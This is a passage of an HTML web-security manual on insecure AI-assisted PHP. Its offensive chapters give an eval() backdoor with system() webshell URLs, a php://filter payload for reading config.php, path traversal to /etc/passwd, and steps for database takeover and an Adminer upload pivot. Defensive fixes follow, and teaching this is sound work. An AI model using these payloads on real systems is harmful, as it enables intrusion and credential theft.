                used.</p>
            <h2>4. The Comment Ratio</h2>
            <p>Humans write comments to explain complex business logic.
                AI writes comments to explain syntax.</p>
            <p><strong>Human Comment:</strong>
                <code>// We add 24 hours to the timestamp because the Nairobi server is ahead.</code>
            </p>
            <p><strong>AI Comment:</strong>
                <code>// Create a new DateTime object</code>
                <code>$date = new DateTime();</code>
            </p>
            <p>If you see comments explaining that <code>if ($x &gt; 5)</code> means "if x is greater than 5," you are
                looking at AI-generated fluff.</p>
            <h2>Conclusion of Part 1</h2>
            <p>We have defined the threat. Vibe Coding is the rapid deployment of insecure, misunderstood code by
                assemblers using tools they do not comprehend.
                They build Monoliths. They hardcode secrets. They ignore errors.</p>
            <p>In <strong>Part 2</strong>, we switch gears. We stop analyzing the developer and start attacking the
                system. It is time to go on the offensive.</p>
            <hr />
            <p>"To catch a bot, look for the code that has no soul."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <h1 style="margin-top:100px;">PART 2 OFFENSIVE SECURITY</h1>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 2.1: Reconnaissance: From Domain to IP in 2 Seconds</h1>
            <hr />
            <h2>The Art of Finding</h2>
            <p>Reconnaissance (Recon) is the most critical phase of any engagement. If you fail here, you will spend
                hours attacking a firewall instead of the vulnerable application behind it.</p>
            <p>In 90% of the cases we see at Marliz Intel, the attacker wins not because they used a complex exploit,
                but because they found a forgotten subdomain that the admin left unprotected.</p>
            <h2>The Basic Ping</h2>
            <p>The journey usually begins with a simple question. "Is it alive?"</p>
            <pre><code class="language-bash">ping marlizintel.com
</code></pre>
            <p>This tells us two things:
                1. The server is up (if it replies).
                2. The IP address where the domain points.</p>
            <p>However, a smart target will block ICMP packets (ping requests). A lack of reply does not mean the target
                is down. It just means they aren't talking to strangers.</p>
            <h2>Digging Deeper with DNS</h2>
            <p>When <code>ping</code> fails or gives us little metadata, we query the Name Servers.</p>
            <pre><code class="language-bash">nslookup -type=any marlizintel.com
</code></pre>
            <p>We are looking for:
                - <strong>A Records</strong>: The direct IP address (IPv4).
                - <strong>AAAA Records</strong>: The IPv6 address.
                - <strong>MX Records</strong>: The mail server. This is often hosted on the same infrastructure or by a
                third party (like Google Workspace or ProtonMail).
                - <strong>TXT Records</strong>: These can verify ownership for services. Sometimes lazy admins leave
                sensitive info here.</p>
            <h2>The Cloudflare Wall</h2>
            <p>If the IP address belongs to Cloudflare, Akamai, or AWS CloudFront, you have a problem. You are not
                seeing the server; you are seeing the shield.</p>
            <p>Attacking Cloudflare is a waste of time. You need the <strong>Origin IP</strong>.</p>
            <h3>Finding the Origin</h3>
            <ol>
                <li><strong>DNS History</strong>: Services like SecurityTrails record historical DNS data. The domain
                    might use Cloudflare today, but two months ago, it might have pointed directly to
                    <code>192.168.x.x</code>.
                </li>
                <li><strong>Subdomains</strong>: The main site <code>www.target.com</code> might be proxied, but the
                    developer portal <code>dev.target.com</code> often exposes the direct server IP.</li>
            </ol>
            <h2>Passive vs Active</h2>
            <ul>
                <li><strong>Active Recon</strong>: You touch the server. <code>ping</code>, <code>nmap</code>, directory
                    busting. The target creates logs. You can be detected.</li>
                <li><strong>Passive Recon</strong>: You query third-party databases (Shodan, Whois, Censys). You never
                    touch the target. You are invisible.</li>
            </ul>
            <p>The professional starts with Passive. The amateur starts with Active and gets banned in 5 minutes.</p>
            <hr />
            <p>"Knowing where to strike is more important than knowing how simple the strike is."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 2.2: Directory Enumeration: Finding the Hidden Doors</h1>
            <hr />
            <h2>The Unlisted Map</h2>
            <p>A web browser only shows you what the developer wants you to see. But the web server contains files that
                were never meant to be public. Backups, old versions, configuration files, and "hidden" admin panels.
            </p>
            <p>Directory Enumeration (or "Dirbusting") is the process of guessing these filenames.</p>
            <h2>The Logic of Brute Force</h2>
            <p>We do not randomly guess characters. We use "Wordlists". These are massive text files containing the most
                common directory names found on the internet.</p>
            <ul>
                <li><code>admin</code></li>
                <li><code>login</code></li>
                <li><code>backup</code></li>
                <li><code>test</code></li>
                <li><code>config</code></li>
                <li><code>db</code></li>
            </ul>
            <p>Tools like <strong>Gobuster</strong> or <strong>Dirb</strong> take this list and send a request for each
                one.</p>
            <p><code>GET /admin</code> -&gt; 404 (Not Found)
                <code>GET /login</code> -&gt; 200 (Found!)
            </p>
            <h2>Using Gobuster</h2>
            <p>The standard command for directory enumeration:</p>
            <pre><code class="language-bash">gobuster dir -u https://marlizintel.com -w /usr/share/wordlists/common.txt
</code></pre>
            <p><strong>Key Flags:</strong>
                - <code>-u</code>: The target URL.
                - <code>-w</code>: The wordlist to use.
                - <code>-x</code>: Extensions to search for (e.g., <code>php,html,zip,bak</code>).</p>
            <p>Addition of the <code>-x</code> flag is crucial. Finding <code>config</code> (404) is useless. Finding
                <code>config.php.bak</code> (200) gives you the database passwords.
            </p>
            <h2>Interpreting Status Codes</h2>
            <p>The server response tells you the state of the door:</p>
            <ol>
                <li><strong>200 OK</strong>: The door is open. The file exists and you can read it.</li>
                <li><strong>301 Redirect</strong>: You are being moved. Usually from <code>/admin</code> to
                    <code>/admin/login.php</code>. This confirms the directory exists.
                </li>
                <li><strong>403 Forbidden</strong>: The door is locked. The server acknowledges the file exists but
                    refuses to show it. This is often <em>more</em> interesting than a 200, because it implies there is
                    something worth hiding.</li>
                <li><strong>404 Not Found</strong>: The door does not exist. Move on.</li>
            </ol>
            <h2>The ".git" Catastrophe</h2>
            <p>One of the most devastating findings is a <strong>200 OK</strong> on the <code>/.git/</code> directory.
            </p>
            <p>If a developer deploys their entire git repository to the live server, you can download the entire
                version history of the project. This includes every previous version of the code, and often, secrets
                that were "deleted" in later commits.</p>
            <p>Tools like <code>git-dumper</code> can reconstruct the entire source code on your local machine.</p>
            <hr />
            <p>"The most dangerous file on a server is often the one the developer forgot to delete."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 2.3: Remote Code Execution: The eval() Disaster</h1>
            <hr />
            <h2>The Apex Predator of Vulnerabilities</h2>
            <p>Remote Code Execution (RCE) is the highest severity vulnerability that can exist on a web server. It
                allows an attacker to bypass the application logic entirely and execute commands directly on the
                operating system.</p>
            <p>It turns a website visitor into a server administrator.</p>
            <h2>Understanding eval()</h2>
            <p>In PHP (and JavaScript/Python equivalents), <code>eval()</code> is a function that takes a string of text
                and executes it as code.</p>
            <pre><code class="language-php">$code = &quot;echo 'Hello World';&quot;;
eval($code);
</code></pre>
            <p>This seems harmless until user input is introduced.</p>
            <h2>The Diagnostic Backdoor</h2>
            <p>Vibe Coders often ask AI for a way to "remotely debug" their application or "run commands from the
                browser." The AI frequently suggests the following pattern:</p>
            <pre><code class="language-php">// debug.php
if (isset($_GET['cmd'])) {
    eval($_GET['cmd']);
}
</code></pre>
            <p>This three-line script is a nuclear weapon.</p>
            <h2>The Kill Chain</h2>
            <p>Once an attacker discovers this file (often via Directory Enumeration), the exploitation is trivial.</p>
            <h3>Step 1: Verification</h3>
            <p>The attacker sends a simple mathematical operation or print command to confirm code execution.</p>
            <p>URL: <code>target.com/debug.php?cmd=echo 10+10;</code>
                Output: <code>20</code></p>
            <h3>Step 2: System Reconnaissance</h3>
            <p>The attacker switches from PHP code to System commands using <code>system()</code> or
                <code>shell_exec()</code>.
            </p>
            <p>URL: <code>target.com/debug.php?cmd=system('whoami');</code>
                Output: <code>www-data</code></p>
            <p>This confirms they are running as the web server user.</p>
            <h3>Step 3: Total Takeover</h3>
            <p>The attacker keeps the "webshell" purely in memory or writes a more permanent backdoor.</p>
            <p>URL: <code>target.com/debug.php?cmd=system('ls -la /');</code></p>
            <p>They can now read <code>/etc/passwd</code>. They can traverse directories. They can delete the entire
                database.</p>
            <h2>Why It Happens</h2>
            <p>Developers resort to <code>eval()</code> when they need "dynamic behavior" but lack the architectural
                skill to implement it safely. They want to calculate prices dynamically or run custom logic for a
                specific client.</p>
            <p>Instead of building a rule engine, they just let the client (and the hacker) write the rules.</p>
            <hr />
            <p>"If you invite the user to write code, do not be surprised when they write an exploit."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 2.4: Credential Harvesting: Reading config.php</h1>
            <hr />
            <h2>The Keys to the Kingdom</h2>
            <p>In 99% of PHP applications, the database connection details are stored in a file named
                <code>config.php</code>, <code>db.php</code>, or <code>.env</code>.
                This file contains the <strong>Crown Jewels</strong>: <code>DB_HOST</code>, <code>DB_NAME</code>,
                <code>DB_USER</code>, and <code>DB_PASS</code>.
            </p>
            <p>If an attacker reads this file, the firewall does not matter. The encryption does not matter. The
                attacker <em>is</em> the admin.</p>
            <h2>The Mechanic: How Web Servers Handle Files</h2>
            <p>To understand how to steal this file, you must understand how Apache and Nginx work.</p>
            <p>When you request <code>https://target.com/index.php</code>, the server looks at the extension
                <code>.php</code>.
                1. It sees <code>.php</code> in its MIME mapping.
                2. It sends the file to the <strong>PHP Preprocessor (PHP-FPM)</strong>.
                3. PHP executes the code (<code>&lt;?php $pass="secret"; ?&gt;</code>).
                4. PHP returns the <em>output</em> (which is usually nothing for a config file).
                5. The browser sees a blank page.
            </p>
            <p><strong>The Goal:</strong> We must trick the server into skipping Step 2. We want the server to treat the
                file as <strong>Plain Text</strong>, not <strong>Code</strong>.</p>
            <hr />
            <h2>Method 1: The Backup Mistake (The Vibe Coder Special)</h2>
            <p>Vibe Coders are terrified of breaking things. So before they edit the config to change a password, they
                make a copy.
                They rename <code>config.php</code> to <code>config.php.bak</code>, <code>config.php.old</code>, or
                <code>config.php_copy</code>.
            </p>
            <h3>The Vulnerability</h3>
            <p>Apache knows that <code>.php</code> is code.
                Apache <em>does not</em> know what <code>.bak</code> is.</p>
            <p>When you request <code>target.com/config.php.bak</code>:
                1. Server checks extension <code>.bak</code>.
                2. No handler exists for <code>.bak</code>.
                3. Server falls back to default behavior: <strong>Serve as Download</strong>
                (<code>application/octet-stream</code>).
                4. The browser downloads the raw source code.</p>
            <p><strong>War Story: The "Hidden" Dotfile</strong>
                A Kenyan SACCO had a secure site. But the developer used <code>nano</code> to edit files on the server.
                When <code>nano</code> crashes or is closed improperly, it leaves a recovery file named
                <code>.config.php.swp</code> (Swap file).
                We scanned for <code>.swp</code> files. We downloaded it. It contained the database credentials.
                <strong>Lesson</strong>: Tools leave artifacts. Artifacts leak data.
            </p>
            <hr />
            <h2>Method 2: PHP Wrapper LFI (Bypassing Execution)</h2>
            <p>If the site has a Local File Inclusion vulnerability (e.g., <code>index.php?page=about</code>), everyday
                attackers try to read <code>/etc/passwd</code>.
                Pros try to read <code>config.php</code>.</p>
            <p><strong>The Failure:</strong>
                Request: <code>index.php?page=config.php</code>
                Result: The server <code>include()</code>s the file. It executes it. You see a blank screen because
                <code>$password = "123"</code> produces no HTML output.
            </p>
            <p><strong>The Fix: <code>php://filter</code></strong>
                PHP has a built-in stream wrapper system. We can tell PHP to "filter" the stream before using it.</p>
            <p><strong>Payload:</strong>
                <code>index.php?page=php://filter/convert.base64-encode/resource=config.php</code>
            </p>
            <p><strong>What happens:</strong>
                1. PHP opens <code>config.php</code>.
                2. PHP passes the content through the <code>base64-encode</code> filter.
                3. The opening tag <code>&lt;?php</code> becomes <code>PD9waHA=</code>.
                4. Since it no longer looks like code, the <code>include()</code> statement treats it as a string and
                prints it to the screen.</p>
            <p><strong>The Result:</strong>
                You see a massive block of random text:
                <code>PD9waHANCiRkYl91c2VyID0gJ2FkbWluJzsNCiRkYl9wYXNzID0gJ3N1cGVyc2VjcmV0Jzs...</code>
            </p>
            <p><strong>The Loot:</strong>
                Copy that string. Run <code>base64 -d</code> on your terminal.
                You now have the source code.</p>
            <hr />
            <h2>Method 3: The Text Editor Artifacts</h2>
            <p>Developers use VS Code, JetBrains, or Sublime Text. These editors create hidden folders like
                <code>.vscode/</code> or <code>.idea/</code>.
                Often, the <code>sftp-config.json</code> file inside these folders contains the FTP credentials for the
                server, stored in plain text.
            </p>
            <p><strong>Attack Vector:</strong>
                <code>GET /.vscode/sftp.json</code>
                <code>GET /.idea/webServers.xml</code>
            </p>
            <p>If the <code>.gitignore</code> didn't catch these, and they were uploaded, you just compromised the FTP
                account.</p>
            <hr />
            <h2>Drill: The Manual Check</h2>
            <p>Don't rely on tools. Use <code>curl</code> to verify exactly what the server is telling you.</p>
            <pre><code class="language-bash"># Check for backup file
curl -I -X GET https://target.com/config.php.bak

# Analyze Headers
HTTP/1.1 200 OK
Content-Type: text/plain  &lt;-- THIS IS THE WIN
Content-Length: 456
</code></pre>
            <p>If <code>Content-Type</code> is <code>text/html</code>, it executed (Bad for us).
                If <code>Content-Type</code> is <code>text/plain</code> or <code>application/octet-stream</code>, it
                downloaded (Good for us).</p>
            <hr />
            <p>"A secret that is written down is only as safe as the paper it is written on."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 2.5: Database Hijacking: The MySQL Workbench Attack</h1>
            <hr />
            <h2>Direct Database Access</h2>
            <p>Once you have harvested credentials from <code>config.php</code>, the web interface becomes irrelevant.
                Why guess the admin password on the login page when you can just rewrite the database directly?</p>
            <p>This phase is called Database Hijacking.</p>
            <h2>The Tool of Choice</h2>
            <p>We do not use strange hacker scripts for this. We use <strong>MySQL Workbench</strong>. This is the
                standard administrative tool for database management. By using legitimate tools, our traffic looks like
                administrative maintenance, not an attack.</p>
            <h2>The Connection Logic</h2>
            <ol>
                <li><strong>Host</strong>: The IP address found durng Reconnaissance.</li>
                <li><strong>Username</strong>: From the leaked <code>config.php</code>.</li>
                <li><strong>Password</strong>: From the leaked <code>config.php</code>.</li>
                <li><strong>Port</strong>: 3306 (Default MySQL port).</li>
            </ol>
            <h2>The "Any Host" Vulnerability</h2>
            <p>By default, MySQL only allows connections from <code>localhost</code>. However, Vibe Coders often develop
                from their home computers. To make this work, they log into their hosting control panel (cPanel or
                Hostinger) and enable "Remote MySQL."</p>
            <p>They are asked to provide an IP address. They do not have a static IP, so they become frustrated.</p>
            <p>They enter <code>%</code>.</p>
            <p>In SQL, <code>%</code> allows connections from <strong>any IP address in the world</strong>.</p>
            <h2>Execution: The Admin Reset</h2>
            <p>Once connected via Workbench, we have full read/write access to the database.</p>
            <ol>
                <li>We open the <code>users</code> or <code>admin</code> table.</li>
                <li>We locate the administrator account.</li>
                <li>We see the password hash. We cannot reverse it easily.</li>
                <li>We do not need to reverse it. We overwrite it.</li>
            </ol>
            <p>We generate an MD5 hash of a known password (e.g., "Marliz123" -&gt; <code>b78...</code>). We paste this
                hash into the database row and click "Apply."</p>
            <p>We have not just bypassed the lock. We changed the lock. We can now log into the web application's
                dashboard with full privileges.</p>
            <hr />
            <p>"Data does not belong to the one who creates it. It belongs to the one who holds the keys."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 2.6: The Inside Man Attack: Bypassing Firewalls</h1>
            <hr />
            <h2>When the Front Door is Locked</h2>
            <p>Sophisticated hosting environments or prudent sysadmins will block external access to Port 3306. If you
                try to connect via MySQL Workbench from your laptop, the connection will time out.</p>
            <p>The firewall rules state: "Only allow connections from Localhost."</p>
            <p>This stops external attackers. But it does not stop us, because we can become "Localhost."</p>
            <h2>The Pivot Concept</h2>
            <p>The web application itself (WordPress, Laravel, custom PHP) is hosted on the same server network as the
                database. It connects via <code>localhost</code>. If we can execute code on the server, we inherit its
                privileges.</p>
            <p>We need a database client that runs <em>on</em> the server.</p>
            <h2>The Tool: Adminer</h2>
            <p><strong>Adminer</strong> is a single-file PHP script that functions like phpMyAdmin. It creates a full
                database management GUI. It consists of one file, usually named <code>adminer.php</code>.</p>
            <h2>The Execution</h2>
            <ol>
                <li><strong>Locate an Upload Vector</strong>: We find an image upload form, a document submission
                    portal, or we use a previously established Web Shell.</li>
                <li><strong>Deploy the Agent</strong>: We upload <code>adminer.php</code> to the server.</li>
                <li><strong>Access</strong>: We navigate to <code>https://target.com/uploads/adminer.php</code>.</li>
                <li><strong>Connect</strong>:</li>
                <li>Server: <code>localhost</code> (This is the key. From the perspective of the script, it is local.)
                </li>
                <li>Username/Password: From <code>config.php</code>.</li>
            </ol>
            <h2>Bypassing the Firewall</h2>
            <p>The firewall sees an inbound HTTP request to port 443 (HTTPS). This is allowed traffic.
                The web server executes the PHP script, which opens a connection to port 3306 <em>internally</em>. This
                is allowed traffic.</p>
            <p>The firewall is effectively bypassed because the request originates from inside the castle.</p>
            <h2>Cleanup</h2>
            <p>This method leaves a high-risk artifact on the server. If you leave <code>adminer.php</code> in a public
                directory, anyone can find it and brute force the database password. A responsible audit requires the
                immediate deletion of this tool after the proof-of-concept is documented.</p>
            <hr />
            <p>"A wall is only as strong as the people you let inside the gate."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 2.7: Path Traversal (LFI): Reading System Files</h1>
            <hr />
            <h2>Escaping the Web Root</h2>
            <p>A web server is designed to keep visitors inside a specific directory, usually
                <code>/var/www/html</code>. Path Traversal (also known as Local File Inclusion or LFI) is the
                vulnerability that allows an attacker to step outside this sandbox and roam the entire server file
                system.
            </p>
            <h2>The Mechanism</h2>
            <p>The vulnerability exists when an application takes a filename as input and passes it directly to a
                filesystem function.</p>
            <p><strong>Vulnerable Code:</strong></p>
            <pre><code class="language-php">$page = $_GET['page']; // User input: &quot;home&quot;
include($page . &quot;.php&quot;); // Includes &quot;home.php&quot;
</code></pre>
            <p>The developer expects the user to request "contact" or "about."
                The attacker requests: <code>../../../../etc/passwd</code></p>
            <p>The code executes: <code>include("../../../../etc/passwd.php");</code></p>
            <p>Note: In modern PHP versions, the null byte injection (<code>%00</code>) required to strip the
                <code>.php</code> extension is patched. However, many include functions do not force an extension, or
                the attacker targets files that <em>have</em> the extension (like other PHP config files).
            </p>
            <h2>High-Value Targets</h2>
            <p>When we have LFI, we look for system files that prove the compromise or leak information.</p>
            <ol>
                <li><strong>Linux</strong>: <code>/etc/passwd</code></li>
                <li>Returns a list of all users on the system. Useful for brute-forcing SSH later.</li>
                <li><strong>Linux</strong>: <code>/proc/self/environ</code></li>
                <li>In containerized environments (Docker/Kubernetes), API keys are often stored in environment
                    variables. LFI here leaks everything.</li>
                <li><strong>Windows</strong>: <code>C:\Windows\win.ini</code></li>
                <li>Standard proof of existence for Windows servers.</li>
                <li><strong>Application Logs</strong>: <code>/var/log/apache2/access.log</code></li>
                <li>If we can read the logs, we can poison them. (See: Log Poisoning techniques).</li>
            </ol>
            <h2>Defense: Whitelisting</h2>
            <p>Sanitization (removing <code>../</code>) is prone to failure. Attackers use <code>....//</code> or URL
                encoding to bypass filters.</p>
            <p>The only secure method is a strict whitelist.</p>
            <p><strong>Secure Code:</strong></p>
            <pre><code class="language-php">$allowed = ['home', 'about', 'contact'];
if (in_array($_GET['page'], $allowed)) {
    include($_GET['page'] . '.php');
} else {
    // 404 Error
}
</code></pre>
            <hr />
            <p>"The filesystem is a tree. Do not let the user climb it."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 2.8: Case Study: The Playkart Full Kill Chain</h1>
            <hr />
            <h2>20 Minutes to Total Compromise</h2>
            <p>This case study details a Red Team engagement performed by Marliz Intel in late 2025. The target,
                "Playkart," was a rapidly deployed e-commerce platform built using the Vibe Coding methodology.</p>
            <p><strong>Target</strong>: Playkart (Anonymized)
                <strong>Goal</strong>: Access Customer PII (Personally Identifiable Information)
                <strong>Time Elapsed</strong>: 22 Minutes
            </p>
            <h2>Phase 1: Reconnaissance (T+00:00)</h2>
            <p>We began with a simple ping. The domain resolved to a direct IP address hosted on a budget VPS provider.
                There was no Cloudflare. No WAF.</p>
            <h2>Phase 2: Enumeration (T+00:05)</h2>
            <p>We ran <code>gobuster</code> against the target.</p>
            <pre><code class="language-bash">gobuster dir -u http://playkart.com -w common.txt -x php,bak,zip
</code></pre>
            <p><strong>Result:</strong>
                - <code>/admin</code> (301 Redirect -&gt; Login Page)
                - <code>/uploads</code> (200 OK - Directory Listing Enabled)
                - <code>/test</code> (200 OK)</p>
            <h2>Phase 3: The Leak (T+00:10)</h2>
            <p>Inside the <code>/test</code> directory, we found a file named <code>db_test.php</code>.
                The developer created this file to check if the database connection was working.</p>
            <p><strong>Content of <code>db_test.php</code>:</strong></p>
            <pre><code class="language-php">&lt;?php
$conn = new mysqli(&quot;localhost&quot;, &quot;playkart_admin&quot;, &quot;Keny@2025!&quot;, &quot;playkart_db&quot;);
if ($conn-&gt;connect_error) {
    die(&quot;Connection failed: &quot; . $conn-&gt;connect_error);
}
echo &quot;Connected successfully&quot;;
?&gt;
</code></pre>
            <p>The file printed "Connected successfully" to the screen. However, because the server display errors were
                on, we triggered a warning by sending invalid parameters, which leaked the stack trace. More
                importantly, we simply guessed the file structure based on standard generic patterns. But in this
                specific instance, we didn't initially see the password.</p>
            <p><strong>Correction</strong>: We found <code>db_test.php.bak</code> in the same folder.
                This file contained the credentials in plain text.</p>
            <h2>Phase 4: The Takeover (T+00:15)</h2>
            <p>We opened MySQL Workbench.
                We input the IP address and the credentials found in the backup file.
                The connection was successful. The firewall was open.</p>
            <h2>Phase 5: Persistence (T+00:22)</h2>
            <p>We queried the <code>admin_users</code> table.
                We updated the password hash for the <code>super_admin</code> user.
                We logged into the Playkart dashboard as the administrator.</p>
            <h2>Aftermath</h2>
            <p>We had full control of the orders, customer addresses, and phone numbers. We generated a report and
                closed the connection.</p>
            <p>The developer had focused on the frontend animations. They forgot that a chain is only as strong as its
                weakest link. In this case, the link was a forgotten backup file in a test directory.</p>
            <hr />
            <p>"Security is not a product. It is a process. And Playkart had neither."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <h1 style="margin-top:100px;">PART 3 DEFENSIVE SECURITY</h1>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 3.1: The 10-Minute Patch: MTTD and MTTR</h1>
            <hr />
            <h2>The Metrics of Survival</h2>
            <p>In cybersecurity, we measure success with two clocks.</p>
            <ol>
                <li><strong>MTTD (Mean Time To Detect)</strong>: How long is the attacker inside before you know?</li>
                <li><strong>MTTR (Mean Time To Respond)</strong>: How long does it take you to stop them once you know?
                </li>
            </ol>
            <p>For most Vibe Coded applications, the MTTD is "Infinity." They never detect the breach until the bank
                account is empty or the database is deleted.</p>
            <h2>The Firefighter Mindset</h2>
            <p>When you are called to save a hacked application, you are not an architect. You are a firefighter. You do
                not worry about "clean code" or "SOLID principles." You worry about putting out the fire.</p>
            <h2>The 10-Minute Patch</h2>
            <p>You have ten minutes to stop the active exploitation.</p>
            <p>If user data is leaking via a vulnerable endpoint, you do not spend an hour isolating the specific
                variable causing the issue. You kill the endpoint.</p>
            <p><strong>Scenario:</strong>
                An attacker is using SQL Injection on <code>search.php</code>.</p>
            <p><strong>The Architect's Fix (Too Slow):</strong>
                Rewrite the search query using PDO prepared statements, test the new query, commit to Git, deploy via
                CI/CD.
                Time: 45 minutes. Data lost: 45,000 records.</p>
            <p><strong>The Firefighter's Fix (Right Now):</strong>
                Open <code>search.php</code>. Add <code>die("Maintenance Mode");</code> to the top of the file. Save.
                Time: 30 seconds. Data lost: 50 records.</p>
            <h2>Triage Levels</h2>
            <ol>
                <li><strong>Bleeding Out (Critical)</strong>: Active data exfiltration or RCE.</li>
                <li><strong>Action</strong>: Take the site offline or block specific IPs in <code>.htaccess</code>.</li>
                <li><strong>Broken Bone (Major)</strong>: Defacement or functional damage.</li>
                <li><strong>Action</strong>: Restore from backup, then patch the hole.</li>
                <li><strong>Bruise (Minor)</strong>: Failed login attempts.</li>
                <li><strong>Action</strong>: Monitor and rate-limit.</li>
            </ol>
            <h2>Moving from Patch to Cure</h2>
            <p>The 10-minute patch is temporary. It buys you time to breathe. Once the attack is blocked, then you
                become the architect again. You look at the <code>search.php</code> file, you implement the PDO prepared
                statements, and you remove the maintenance mode.</p>
            <p>But never prioritize elegance over survival.</p>
            <hr />
            <p>"It is better to have a broken website than a stolen database."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 3.2: Input Validation: Killing ../ Before It Kills You</h1>
            <hr />
            <h2>Trust No One</h2>
            <p>The cardinal sin of Vibe Coding is trusting the <code>$_GET</code> and <code>$_POST</code> superglobals.
                The developer assumes that because the frontend form only allows numbers, the backend receives only
                numbers.</p>
            <p>This is false. We play with <code>curl</code>. We send whatever we want.</p>
            <h2>White-List vs Black-List</h2>
            <p>There are two ways to filter input.</p>
            <ol>
                <li><strong>Black-Listing</strong>: "Block everything that looks like a hack."<ul>
                        <li>We try to block <code>../</code>, <code>&lt;script&gt;</code>, <code>UNION</code>.</li>
                        <li>This fails because attackers are creative. <code>....//</code> gets past <code>../</code>.
                        </li>
                    </ul>
                </li>
                <li><strong>White-Listing</strong>: "Allow only what is known to be good."<ul>
                        <li>We allow only <code>[a-z0-9]</code>.</li>
                        <li>If the input contains anything else, we reject it.</li>
                    </ul>
                </li>
            </ol>
            <p>White-listing is the only secure method.</p>
            <h2>Practical Defenses</h2>
            <h3>1. Defeating Path Traversal</h3>
            <p>To stop LFI, we must ensure filenames do not contain directory separators.</p>
            <p><strong>The Fix: <code>basename()</code></strong>
                This PHP function strips all directory information from a path.</p>
            <pre><code class="language-php">$file = $_GET['file']; // &quot;../../../etc/passwd&quot;
$clean = basename($file); // &quot;passwd&quot;
include($clean); // Fails safely
</code></pre>
            <h3>2. Defeating Integer Injection</h3>
            <p>If a parameter is supposed to be an ID, force it to be an integer.</p>
            <p><strong>The Fix: Type Casting</strong></p>
            <pre><code class="language-php">$id = (int)$_GET['id'];
// If input is &quot;1 UNION SELECT...&quot;, $id becomes 1.
// If input is &quot;hello&quot;, $id becomes 0.
</code></pre>
            <p>The injection is neutralized before it even reaches the database.</p>
            <h3>3. Defeating XSS output</h3>
            <p>When we print user data back to the screen, we must neutralize HTML tags.</p>
            <p><strong>The Fix: <code>htmlspecialchars()</code></strong></p>
            <pre><code class="language-php">echo htmlspecialchars($user_comment, ENT_QUOTES, 'UTF-8');
</code></pre>
            <p>This turns <code>&lt;script&gt;</code> into <code>&amp;lt;script&amp;gt;</code>. The browser displays the
                text, but does not execute the code.</p>
            <h2>The Validation Gate</h2>
            <p>Perform all validation at the very top of your file. If the input is invalid, <code>die()</code>
                immediately. Do not execute a single line of business logic until the data is proven clean.</p>
            <hr />
            <p>"Sanitize your inputs, or your database will be sanitized for you."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 3.3: Environment Isolation: The .env Architecture</h1>
            <hr />
            <h2>Secrets Are Not Code</h2>
            <p>Hardcoding credentials into source files is the single most common cause of data breaches in Vibe Coded
                projects. It leads to:
                1. Credentials leaking to GitHub.
                2. Credentials leaking in stack traces.
                3. Inability to rotate passwords without editing code.</p>
            <p>To fix this, we implement Environment Isolation.</p>
            <h2>The .env File</h2>
            <p>This is a simple text file that stores configuration variables.</p>
            <pre><code class="language-ini">DB_HOST=127.0.0.1
DB_NAME=production_db
DB_USER=admin
DB_PASS=SuperSecretPassword!
DEBUG_MODE=false
</code></pre>
            <p>This file is <strong>never</strong> committed to version control. It stays on the server.</p>
            <h2>The .gitignore</h2>
            <p>You must immediately create a <code>.gitignore</code> file in your repository root and add the following
                line:</p>
            <pre><code>.env
</code></pre>
            <p>This ensures that when you push your code to GitHub, the secrets stay behind. You provide a
                <code>.env.example</code> file instead, with placeholders.
            </p>
            <h2>Loading Secrets in PHP</h2>
            <p>To access these values, we use the <code>$_ENV</code> superglobal or <code>getenv()</code>.</p>
            <p><strong>Modern Approach (using vlucas/phpdotenv):</strong></p>
            <pre><code class="language-php">$dotenv = Dotenv\Dotenv::createImmutable(__DIR__);
$dotenv-&gt;load();

$host = $_ENV['DB_HOST'];
</code></pre>
            <p><strong>Legacy Approach (if you cannot use Composer):</strong>
                You can parse the file manually, but ensure the parser ignores comments and handles lines correctly.</p>
            <h2>Defense in Depth: Placement</h2>
            <p>Where you put the <code>.env</code> file matters.</p>
            <p><strong>Bad:</strong> <code>/var/www/html/.env</code>
                If the web server is misconfigured, <code>target.com/.env</code> will download the secrets.</p>
            <p><strong>Good:</strong> <code>/var/www/.env</code>
                Place the file <strong>outside</strong> the public document root. The PHP script can read files anywhere
                on the disk, but the user via the browser is trapped in <code>/html</code>.</p>
            <pre><code class="language-php">// config.php
$dotenv = Dotenv\Dotenv::createImmutable('/var/www/'); // Load from one level up
</code></pre>
            <p>This makes the <code>config.php</code> file useless to an attacker even if they read it via LFI/Display
                Source. It contains no secrets, only references to variables they cannot access.</p>
            <hr />
            <p>"Your code should be public. Your configuration should be private."
                Marliz Intel Field Manual</p>
        </div>
    </div>
    <div class="page">
        <div class="drop-cap">
            <h1>Chapter 3.4: Session Hardening: Locking Down /admin</h1>
            <hr />
            <h2>The Forgotten Gatekeeper</h2>
            <p>It is common to find a secure login page (<code>login.php</code>) protecting an insecure dashboard. The
                developer checks the password on the login screen, sets a cookie, and redirects the user. But on
                <code>dashboard.php</code>, they forget to check if that cookie is valid.
            </p>
            <h2>The Include Pattern</h2>
            <p>Do not write authentication logic in every file. You will forget one. Write it once.</p>
            <p><strong>File: <code>includes/auth_check.php</code></strong></p>
            <pre><code class="language-php">session_start();

if (!isset($_SESSION['user_id']) || $_SESSION['is_admin'] !== true) {
    header(&quot;Location: /login.php&quot;);
    exit(); // Crucial: Stop script execution immediately
}
</code></pre>
            <p><strong>File: <code>admin/dashboard.php</code></strong></p>
            <pre><code class="language-php">require_once '../includes/auth_check.php';

// The rest of the page...
